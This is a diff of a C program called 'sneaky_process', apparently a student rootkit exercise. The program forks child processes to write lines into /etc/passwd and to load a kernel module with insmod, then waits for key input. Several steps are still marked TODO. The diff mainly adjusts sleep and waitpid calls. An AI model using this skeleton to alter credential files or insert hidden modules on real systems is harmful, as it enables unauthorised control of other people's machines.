@@ -5,6 +5,8 @@
 #include <fcntl.h>
 #include <unistd.h>
 
+#define WAIT_TIME 3000
+
 int main(void){
 	int myPID = getpid();
 	printf("sneaky_process pid=%d\n", myPID);
@@ -33,7 +35,7 @@ int main(void){
 				default:
 					//wrtie new lines to /etc/passwd
 					waitpid(file_mod_pid, NULL, 0);
-					sleep(3000);
+					//sleep(WAIT_TIME);
 					printf("TODO: write new lines to /etc/passwd\n");
 					int fd;
 					char * abs_path = "/etc/passwd";
@@ -48,6 +50,7 @@ int main(void){
 			}
 
 		default:; //Handle kernel insertion and removal here
+			waitpid(main_pid, NULL, 0);
 			int kernel_mod_pid = fork();
 			switch(kernel_mod_pid){
 				case -1:
@@ -55,6 +58,7 @@ int main(void){
 					break;
 				case 0: 
 					//Load kernel here
+					//sleep(WAIT_TIME);
 					printf("TODO: insmod kernel\n");
 					//TODO: verify this is working
 					char arg[1024];
@@ -64,6 +68,7 @@ int main(void){
 					exit(0);
 				default:
 					;//LOOP KEY INPUTS HERE AND QUIT WHEN "Q" IS RECEIVED
+					//sleep(WAIT_TIME);
 					char word[256];
 					while(1){
 						if(fgets(word, sizeof(word), stdin) != NULL){
